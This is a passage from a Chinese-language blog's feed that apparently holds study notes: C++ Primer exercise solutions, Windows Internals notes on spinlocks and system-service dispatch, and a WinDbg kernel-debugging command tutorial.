(VectNum1[i] != VectNum2[i])</div><div class="line">flag = <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (flag == <span class="number">0</span>)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"YES"</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>例5.19：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</div><div class="line"><span class="built_in">string</span> MyString1, MyString2;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入两个字符串"</span>;</div><div class="line"><span class="keyword">do</span></div><div class="line">&#123;</div><div class="line"><span class="built_in">cin</span> &gt;&gt; MyString1 &gt;&gt; MyString2;</div><div class="line">MyString1.size() &gt; MyString2.size() ? <span class="built_in">cout</span> &lt;&lt; MyString2 &lt;&lt;<span class="built_in">endl</span>: <span class="built_in">cout</span> &lt;&lt; MyString1&lt;&lt;<span class="built_in">endl</span>;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入两个字符串"</span>;</div><div class="line">i++;</div><div class="line">&#125; <span class="keyword">while</span> (i != <span class="number">10</span>);</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>例5.20</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">string</span> MyString1, MyString2;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"连续输入两个字符串"</span>;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; MyString1 &gt;&gt; MyString2)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> ((MyString1 == MyString2) &amp;&amp; MyString1[<span class="number">0</span>] &gt;= <span class="string">'A'</span>&amp;&amp;MyString1[<span class="number">0</span>] &lt;= <span class="string">'Z'</span>&amp;&amp;MyString2[<span class="number">0</span>] &gt;= <span class="string">'A'</span>&amp;&amp;MyString2[<span class="number">0</span>] &lt;= <span class="string">'Z'</span>)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; MyString1;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"NO"</span>;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"连续输入两个字符串"</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li><li><p>例5.24</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span>  </span></div><div class="line"><span class="function"></span>&#123;     </div><div class="line">    <span class="keyword">int</span> a,b;  </div><div class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入相除的两个整数："</span>;  </div><div class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b)  </div><div class="line">    &#123;  </div><div class="line">        <span class="keyword">try</span>  </div><div class="line">        &#123;  </div><div class="line">            <span class="keyword">if</span> (b == <span class="number">0</span>) <span class="keyword">throw</span> <span class="built_in">std</span>::runtime_error(<span class="string">"被除数不能为0"</span>);<span class="comment">//runtime_error异常类:只有在运行时才能检测出的问题  </span></div><div class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="keyword">static_cast</span>&lt;<span class="keyword">double</span>&gt;(a)/b&lt;&lt;<span class="built_in">endl</span>;<span class="comment">//考虑到不可以整除产生小数的情况,先将a强制转化为double类型  </span></div><div class="line">        &#125;  </div><div class="line">        <span class="keyword">catch</span> (runtime_error err)<span class="comment">//err是runtime_error类的一个实例  </span></div><div class="line">        &#123;  </div><div class="line">            <span class="built_in">cout</span> &lt;&lt; err.what() ;实例的成员函数，返回内容由编译其决定  </div><div class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"\n是否需要重新输入? Enter y or n:"</span> &lt;&lt; <span class="built_in">endl</span>;  </div><div class="line">            <span class="keyword">char</span> c;  </div><div class="line">            <span class="built_in">cin</span> &gt;&gt; c;  </div><div class="line">            <span class="keyword">if</span> (!<span class="built_in">cin</span> || c == <span class="string">'n'</span>)  </div><div class="line">                <span class="keyword">break</span>;<span class="comment">//break只能用在开关体或者循环体中  </span></div><div class="line">        &#125;<span class="comment">//简单来说try是检测异常的，如果产生了异常，就throw(抛出)一个异常，然后被catch到，进行异常的处理  </span></div><div class="line">        <span class="comment">//如果没有catch部分，仅有try，仍然会报错  </span></div><div class="line">    &#125;  </div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;&lt;p&gt;例5.16：&lt;/p&gt;
&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;d
      
    
    </summary>
    
      <category term="C++" scheme="http://yoursite.com/categories/C/"/>
    
    
  </entry>
  
  <entry>
    <title>第三章：系统机制-同步</title>
    <link href="http://yoursite.com/2018/04/08/%E3%80%8AWindows%20Internals%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0_%E5%90%8C%E6%AD%A5/"/>
    <id>http://yoursite.com/2018/04/08/《Windows Internals》第三章_同步/</id>
    <published>2018-04-08T07:02:11.000Z</published>
    <updated>2018-04-09T04:44:36.758Z</updated>
    
    <content type="html"><![CDATA[<h1 id="3-3-同步"><a href="#3-3-同步" class="headerlink" title="3.3 同步"></a>3.3 同步</h1><h2 id="高IRQL的同步"><a href="#高IRQL的同步" class="headerlink" title="高IRQL的同步"></a>高IRQL的同步</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在内核执行的各个阶段，内核必须保证在临界区中同一时刻只有一个处理器在执行，内核必须保证所有线程按照互斥的方法访问这些数据（内核临界区）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于中断的发生，该中断的处理例程需要修改一个全局的数据结构，与此同时，内核恰好在更新该数据结构，违背了互斥的原则（同一时间只有一个处理器访问数据结构）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windows采用了一个比较复杂的方法：首先内核先将处理器的IRQL(中断请求级别)提高到能访问该数据结构的最高的级别，这样就屏蔽了在中断处理例程中使用该资源的中断。<strong>但是这种策略对于单处理器来说是可以的，但是不能阻止多处理器发生中断。</strong> </p><h2 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内核用来实现多处理器互斥的机制是自旋锁。自旋锁是一个与某个局部变量相关联的锁原语，在进入临界区之前，内核（处理器）会一直尝试获取相关联的自旋锁，直到成功为止。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自旋锁是通过硬件支持的test-and-set操作来实现的，也即：在一条原子指令内测试并获取锁，这样避免多线对锁的争夺。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;每一个自旋锁都拥有一个IRQL，并且这个IRQL总是在DPC/Dispatch或者更高级别，因为这个原因，如果一个线程拥有自旋锁，则他永远不会被抢占。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;任何一个试图获取自旋锁的处理器本质上都是处于忙等状态。<strong>因为处理器在进入临界区之前会循环的去获取自旋锁</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用pause汇编指令，插入到忙等的循环中，这条指令告诉处理器他正在执行的部分是自旋锁的获取循环部分。  </p><h2 id="排队的自旋锁"><a href="#排队的自旋锁" class="headerlink" title="排队的自旋锁"></a>排队的自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当一个处理器想要获取被其他处理器持有的自旋锁的时候，他会把自己的标志符放在与该自旋锁关联的队列中，如果当前正持有自旋锁的处理器释放的，则其将自旋锁移交给队列的第一个处理器，如果处理器正在等待一个忙着的自旋锁，他会检查处于该处理器之前的处理器的标志，<strong>而不是检查自旋锁的标志</strong>。<strong>说是排队的自旋锁，还不如说是排队等待自旋锁的处理器</strong>。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;锁是留给内核使用的，所以，在设备驱动程序中获取这些排队的自旋锁是不被支持的。</p><h2 id="栈内排队的自旋锁"><a href="#栈内排队的自旋锁" class="headerlink" title="栈内排队的自旋锁"></a>栈内排队的自旋锁</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;自旋锁句柄是一个数据结构。包含了<strong>锁的所有权</strong>（要求局部变量的原因所在）和处理器队列等状态信息，由此，<strong>句柄不应该是一个全局变量，往往是一个栈变量，以保证调用线程的局部性。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;3-3-同步&quot;&gt;&lt;a href=&quot;#3-3-同步&quot; class=&quot;headerlink&quot; title=&quot;3.3 同步&quot;&gt;&lt;/a&gt;3.3 同步&lt;/h1&gt;&lt;h2 id=&quot;高IRQL的同步&quot;&gt;&lt;a href=&quot;#高IRQL的同步&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
      <category term="windows系统" scheme="http://yoursite.com/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>windbg内核调试（1）</title>
    <link href="http://yoursite.com/2018/04/05/windbg%E4%BD%BF%E7%94%A8%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B%EF%BC%881%EF%BC%89/"/>
    <id>http://yoursite.com/2018/04/05/windbg使用简明教程（1）/</id>
    <published>2018-04-05T07:02:11.000Z</published>
    <updated>2018-04-06T06:23:29.865Z</updated>
    
    <content type="html"><![CDATA[<h2 id="配置篇："><a href="#配置篇：" class="headerlink" title="配置篇："></a>配置篇：</h2><ul><li><p>1）安装WinDbg，如果要进入内核模式调试的话需要进行如下步骤：</p><ul><li>1）修改虚拟机C盘根目录下配置文件boot.ini</li><li>2）修改虚拟机设置，添加一个串行串口</li><li>3）在宿主主机启动winbdg，进入内核调试，配置如下<br><img src="https://i.imgur.com/A4wPzBq.png" alt=""></li><li>PS：如果遇到Fail Open \.\pipe\com_1，只需要在快捷方式后面添加<strong>“windbg -b -k com:pipe,port=\.\pipe\com_1,resets=0”</strong>即可<br><img src="https://i.imgur.com/8aGsnQY.png" alt=""><a id="more"></a><h2 id="进程篇"><a href="#进程篇" class="headerlink" title="进程篇"></a>进程篇</h2><h3 id="1-查看进程列表"><a href="#1-查看进程列表" class="headerlink" title="1.查看进程列表"></a>1.查看进程列表</h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有多个命令可以显示进程列表，他们主要是：“|”，“.tlist”,“!process”,“!dml_proc”。  </li></ul></li><li><p><font color="#DC143C">| [进程号]</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>在用户态下，这个命令显示当前被调试进程的状态信息</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被调试进程列表。大多数情况下，调试器中只有一个被调试进程，但可以通过.attach或者.create命令同时挂载或创建多个调试对象。当同时对多个进程调试时，进程号是从0开始的整数。</p></li><li><font color="#DC143C">tlist [选项] [模块名]</font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>在用户模式</strong>下显示系统当前的进程列表，存在两个参数选项：-v:显示进程的详细信息，-c显示当前进程信息。默认是-v<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可以通过“.attach”或者“.create”来创建或者附件多个调试对象<br>   <img src="https://i.imgur.com/7UqOBCF.png" alt=""></li><li><font color="#DC143C">!process:<strong>显示调试器当前运行的进程信息</strong></font><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是这个命令只能在内核调试中使用，如果在用户态中调试，则会出现如下的错误提示。No export prcoess found<br>   <img src="https://i.imgur.com/CgfwHrG.png" alt=""></li><li><font color="#DC143C"><strong>显示当前进程列表（内核态)</strong></font><br>   <img src="https://i.imgur.com/MetSOw4.png" alt=""></li><li><font color="#DC143C"><strong>!process PID:显示PID的详细信息（内核态）</strong></font><br>   <img src="https://i.imgur.com/sAiYXqY.png" alt=""></li><li><p><font color="#DC143C"><strong>!process 0 0 XXX,exe：查找指定进程（用户态中）</strong></font><br>   <img src="https://i.imgur.com/IFDvyGu.png" alt=""><br>   <img src="https://i.imgur.com/Jp3ajSL.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以下是根据上述命令查看到的信息包含的主要内容。</p></li><li><p>Cid : 进程id</p></li><li>Peb : 进程环境块的地址</li><li>ParentCid : 父进程id</li><li>DirBase : 页目录表 (用于转换虚拟地址和物理地址PDT)</li><li>ObjectTable : 进程的句柄表</li></ul><h3 id="2-进程信息"><a href="#2-进程信息" class="headerlink" title="2.进程信息"></a>2.进程信息</h3><ul><li><font color="#DC143C">!peb[address]:查看指定PEB信息，在内核模式下，address可以通过!process 0 0:来查看。如果!peb不带参数，则指的是当前进程的PEB，在用户模式下，只能查看当前进程的PEB，所以不需要带参数。</font><br>  <img src="https://i.imgur.com/oFRU1Nj.png" alt=""></li><li><font color="#DC143C">dt nt!_PEB[address]:此命令显示系统nt模块中所定义的内核结构体PEB详细内容.</font><br>  <img src="https://i.imgur.com/G81Rqs4.png" alt=""><br>  <img src="https://i.imgur.com/Xbj48Tu.png" alt=""></li></ul><h3 id="3-切换进程"><a href="#3-切换进程" class="headerlink" title="3.切换进程"></a>3.切换进程</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>因为进程的地址空间都是相互独立的，所以我们使用dd 0x400000之类的指令是没有意义的。因为我们不确定当前用户地址空间就是我们的目标进程地址空间。因此我们首先要切换到我们想查看的进程上下文。之后才能查看它私有的地址空间。如果不按这个规定的话，有可能得出的结果是很多?????</strong></p><ul><li><font color="#DC143C">.process [process address]:切换当前的进程空间。</font><br>  <img src="https://i.imgur.com/uT5OoeD.png" alt=""></li><li><font color="#DC143C">.context [页目录地址]：如果不使用任何参数，.context命令将显示当前页目录地址。页目录地址就是!process命令中显示的DirBase值。<strong>进程切换后，为了检测是否正确切换，可再用!peb命令检查当前进程的环境信息。</strong></font></li></ul><h3 id="4-加载dll"><a href="#4-加载dll" class="headerlink" title="4.加载dll"></a>4.加载dll</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.peb能显示当前进程所加载的dll，但是.dll能显示当前系统所在加载的dll。<br>    <img src="https://i.imgur.com/aBBULUI.png" alt=""></p><h2 id="线程篇"><a href="#线程篇" class="headerlink" title="线程篇"></a>线程篇</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;命令”~”能够进行线程相关的操作。不带任何参数的情况下，它列出当前调试进程的线程。<br>    <img src="https://i.imgur.com/QLRZoqm.png" alt=""> </p><h3 id="1-线程冰封"><a href="#1-线程冰封" class="headerlink" title="1.线程冰封"></a>1.线程冰封</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;参数f与u分别代表freeze和unfress，前者是指冻住指定线程，后者将被冰冻线程解冻。  </p><ul><li>~2f：暂停该进程的2号线程</li><li>~2u：启动该进程的2号线程</li></ul><h3 id="2-线程切换"><a href="#2-线程切换" class="headerlink" title="2.线程切换"></a>2.线程切换</h3><ul><li>~线程编号（不是TID）：切换线程</li><li>!TEB:查看线程信息块</li><li>~ 线程号 s：在多线程间作切换，需使用~命令的s参数</li><li><strong>~~【线程ID】 s：　注意这个命令中的[]并非可选符，而是命令的一部分。</strong>例如命令：~~[11a0] s，它将当前线程切换到线程ID为0x11a0的线程。线程ID是系统维护的系统唯一的ID值。</li></ul><h3 id="3-遍历线程"><a href="#3-遍历线程" class="headerlink" title="3.遍历线程"></a>3.遍历线程</h3><ul><li>~*k:显示所有线程的栈信息<br>  <img src="https://i.imgur.com/PLIW1aN.png" alt=""></li><li>~*r:显示线程的寄存器信息</li><li>~<em>e -cmd：对线程执行操作：例如：~</em>e k;r就是对线程执行k和r操作。</li></ul><h3 id="查找句柄"><a href="#查找句柄" class="headerlink" title="查找句柄"></a>查找句柄</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用<strong>!handle</strong>来查找句柄。</p><ul><li>!handle &lt;句柄索引&gt;&lt;标志&gt;&lt;进程ID&gt;；句柄索引为0，代表输出所有句柄，为4是输出第一个句柄。<br>  <img src="https://i.imgur.com/hjkBWKp.png" alt=""></li><li>Object标明的是对象的地址。</li><li>Type标明的是句柄的类型。</li><li>HandleCount标明的是引用次数。</li><li>PointerCount标明的是指针指针引用次数。</li></ul><h3 id="异常与事件"><a href="#异常与事件" class="headerlink" title="异常与事件"></a>异常与事件</h3><ul><li>“.lastevent”:显示最近发生的调试事件</li><li>“.exr [mem]”：显示一个异常记录的详细信息<br>  <img src="https://i.imgur.com/VnOEiqm.png" alt=""></li><li>“.exr -1”:显示最近的一条异常信息，可以使用-1代替记录地址。<br>   <img src="https://i.imgur.com/uRnnzeK.png" alt=""></li><li>“!anaylze” :用于分析最近的异常事件，并显示分析结果。<ul><li>-v:显示详细信息。尤其适用于调试错误<br><img src="https://i.imgur.com/F1CAKdp.png" alt=""></li><li>-f:强制所有事件都当成异常来处理</li><li>-hang:这个选项很有用，对于遇到死锁的情况，它会分析原因。在内核环境中，它分析内核锁和DPC栈；在用户环境中，它分析线程的调用栈。用户环境中，调试器只会对当前线程进行分析，所以一定要将线程环境切换到最可能引起问题的那个线程中去，才有帮助。这个参数非常有用，当真的遇到死锁时，它可以救命（另一个分析死锁的有效命令是!locks）</li></ul></li><li>“!error”:此命令和VC里面内置的errlook工具类似。用来根据错误码，查看对应的可读错误信息。微软系统中常用的全局错误码有两套，一套是Win32错误码，通过函数GetLastError()获得的值；另一套是NTSTATUS值。!error命令对这二者都能支持。区别的方法，若错误码后面无参数1，则为Win32错误码；否则就是NTSTATUS错误码。</li><li>“!gle”:　此命令是Get Last Error的缩写。它调用Win32接口函数GetLastError()取得线程的错误值，并打印分析结果。如果带有-all选项，则针对当前进程的所有线程执行GetLastError()操作；否则仅针对当前线程。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;配置篇：&quot;&gt;&lt;a href=&quot;#配置篇：&quot; class=&quot;headerlink&quot; title=&quot;配置篇：&quot;&gt;&lt;/a&gt;配置篇：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;1）安装WinDbg，如果要进入内核模式调试的话需要进行如下步骤：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1）修改虚拟机C盘根目录下配置文件boot.ini&lt;/li&gt;
&lt;li&gt;2）修改虚拟机设置，添加一个串行串口&lt;/li&gt;
&lt;li&gt;3）在宿主主机启动winbdg，进入内核调试，配置如下&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/A4wPzBq.png&quot; alt=&quot;&quot;&gt;&lt;/li&gt;
&lt;li&gt;PS：如果遇到Fail Open \.\pipe\com_1，只需要在快捷方式后面添加&lt;strong&gt;“windbg -b -k com:pipe,port=\.\pipe\com_1,resets=0”&lt;/strong&gt;即可&lt;br&gt;&lt;img src=&quot;https://i.imgur.com/8aGsnQY.png&quot; alt=&quot;&quot;&gt;
    
    </summary>
    
      <category term="windows内核" scheme="http://yoursite.com/categories/windows%E5%86%85%E6%A0%B8/"/>
    
    
  </entry>
  
  <entry>
    <title>第三章：系统机制-陷阱分发</title>
    <link href="http://yoursite.com/2018/03/31/%E3%80%8AWindows%20Internals%E3%80%8B%E7%AC%AC%E4%B8%89%E7%AB%A0_%E7%B3%BB%E7%BB%9F%E6%9C%BA%E5%88%B6/"/>
    <id>http://yoursite.com/2018/03/31/《Windows Internals》第三章_系统机制/</id>
    <published>2018-03-31T07:02:11.000Z</published>
    <updated>2018-04-08T06:52:39.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="3-1：陷阱分发"><a href="#3-1：陷阱分发" class="headerlink" title="3.1：陷阱分发"></a>3.1：陷阱分发</h1><h3 id="第三部分：系统服务分发"><a href="#第三部分：系统服务分发" class="headerlink" title="第三部分：系统服务分发"></a>第三部分：系统服务分发</h3><h4 id="系统服务分发"><a href="#系统服务分发" class="headerlink" title="系统服务分发"></a>系统服务分发</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;windows用于系统服务分发的指令取决于其执行时所在的处理器。<br><a id="more"></a></p><ul><li>在PentiumII之前的处理器，windows使用int 0x2E陷阱指令，使windows填充IDT（中断描述符表Interrupt Descriptor Table）中的2E表项，使其指向系统服务分发器。<strong>该陷阱导致线程由用户模式转换到内核模式，并且进入系统服务分发器。</strong>EAX指明了所请求的系统服务号，EDX指向的是调用者传递给系统服务的参数表</li><li>在PentiumII以后的处理器，使用的是sysenter指令，windows在引导的时候将<strong>内核服务分发器例程的地址保存在MSR（64位CPU寄存器，可以利用rdmsr或者wdmsr来读写）中</strong>，执行该指令后续操作和上面一致。最后利用sysexit返回用户模式。<br>  <img src="https://i.imgur.com/53Yv1LF.png" alt=""></li><li>X64使用syscall指令，将系统调用号保存在eax中，前四个参数放在寄存器（rcx/rdx/r8/r9）中，剩下的参数在栈中</li><li>IA64使用epc指令</li></ul><h4 id="内核模式下的系统分发"><a href="#内核模式下的系统分发" class="headerlink" title="内核模式下的系统分发"></a>内核模式下的系统分发</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在windows内核模式下，CPU不需要进行中断或者syscall了，因为此时CPU已经运行在特权模式下了，只需要像普通的例程调用一样就好，问题是对于NT的函数大多数没有被导出，无法直接调用。但如果直接像调用API一般直接调用NtOpenProcess之类的系统服务函数时，内核保存的原先模式值仍然是用户模式（进内核之前当然是用户模式咯~），但又检测到传递来的地址是一个内核模式地址（因为在当前内核模式下调用），于是会导致调用失败（STATUS_ACCESS_VIOLATION）。<strong>必须使用ZT函数</strong>因为他们已经被文档化了。请见博客：<a href="https://findream.github.io/2018/01/23/%E5%86%85%E6%A0%B8Nt%E5%92%8CZw%E5%87%BD%E6%95%B0%E5%8C%BA%E5%88%AB/" target="_blank" rel="external">https://findream.github.io/2018/01/23/%E5%86%85%E6%A0%B8Nt%E5%92%8CZw%E5%87%BD%E6%95%B0%E5%8C%BA%E5%88%AB/</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;子系统DLL<strong>调用Ntdll.dll中函数（系统调用根本执行的函数）</strong>来实现已经文档化的函数，但是windows USER和GDI函数例外，因为这些函数根本不涉及Ntdll.dll，系统分发指令在user32.dll或者GDI.dll中实现。</p><ul><li>windows内核API调用<ul><li>1）windows应用程序调用Fun()</li><li>2) 调用kernelbase.dll中的Fun()，这是实现调用的核心所在</li><li>3）调用Ntdll.dll中的Fun(),这个Fun去引发系统服务的陷阱，进入内核模式并且把Fun的系统服务号传递给系统服务分发器</li><li>4）系统服务分发器（Ntoskrnl.exe:KiSystemService()）调用Fun执行</li></ul></li><li>USER或者GDI函数<ul><li>1）应用程序中调用USER或者GDI函数</li><li>2）调用User32.dll或者GDI.dll的Fun(),通过systementer进入内核模式，</li><li>3）调用Ntoskrnl.exe的KiSystemService指向Win32k.sys中的服务入口点。</li><li>4）执行服务，并返回</li></ul></li></ul><p>Ring3 —&gt; Ring0 的系统调用：<br>   Kernel32.dll（API）—&gt;ntdll.dll（Nt/Zw）—&gt;用户模式转内核模式—&gt;Ntoskrnl.exe(NT)—&gt;完成I/O请求（原路返回）<br>Ring0 —&gt; Ring0 的系统调用：<br>   Ntoskrnl.exe（Zw）—&gt;Ntoskrnl.exe（Nt）<br>参考文献：<br>windows internals<br><a href="https://www.cnblogs.com/uAreKongqi/p/6597701.html" target="_blank" rel="external">https://www.cnblogs.com/uAreKongqi/p/6597701.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;3-1：陷阱分发&quot;&gt;&lt;a href=&quot;#3-1：陷阱分发&quot; class=&quot;headerlink&quot; title=&quot;3.1：陷阱分发&quot;&gt;&lt;/a&gt;3.1：陷阱分发&lt;/h1&gt;&lt;h3 id=&quot;第三部分：系统服务分发&quot;&gt;&lt;a href=&quot;#第三部分：系统服务分发&quot; class=&quot;headerlink&quot; title=&quot;第三部分：系统服务分发&quot;&gt;&lt;/a&gt;第三部分：系统服务分发&lt;/h3&gt;&lt;h4 id=&quot;系统服务分发&quot;&gt;&lt;a href=&quot;#系统服务分发&quot; class=&quot;headerlink&quot; title=&quot;系统服务分发&quot;&gt;&lt;/a&gt;系统服务分发&lt;/h4&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;windows用于系统服务分发的指令取决于其执行时所在的处理器。&lt;br&gt;
    
    </summary>
    
      <category term="windows系统" scheme="http://yoursite.com/categories/windows%E7%B3%BB%E7%BB%9F/"/>
    
    
  </entry>
  
  <entry>
    <title>C++Primer 第四章：运算符</title>
    <link href="http://yoursite.com/2018/03/30/C++%E7%AC%AC%E5%9B%9B%E7%AB%A0_%E8%BF%90%E7%AE%97%E7%AC%A6/"/>
    <id>http://yoursite.com/2018/03/30/C++第四章_运算符/</id>
    <published>2018-03-30T07:02:11.000Z</published>
    <updated>2018-04-02T07:43:52.554Z</updated>
    
    <content type="html"><![CDATA[<h2 id="4-1-基础"><a href="#4-1-基础" class="headerlink" title="4.1 基础"></a>4.1 基础</h2><h3 id="4-1-2运算符优先级"><a href="#4-1-2运算符优先级" class="headerlink" title="4.1.2运算符优先级"></a>4.1.2运算符优先级</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;算数运算符&gt;关系运算符&gt;逻辑运算符。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">if</span><span class="params">(i!=j&lt;k)</span></span></div><div class="line"><span class="comment">//先比较j和k的大小，计算出来的bool值和i比较是否相等，不相等返回真。</span></div></pre></td></tr></table></figure></p><a id="more"></a><h3 id="4-1-3求值顺序"><a href="#4-1-3求值顺序" class="headerlink" title="4.1.3求值顺序"></a>4.1.3求值顺序</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有四种运算符明确了求值顺序，逻辑与，逻辑或，条件运算符，逗号运算符。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;布尔运算符的计算步骤：bool—–&gt; int 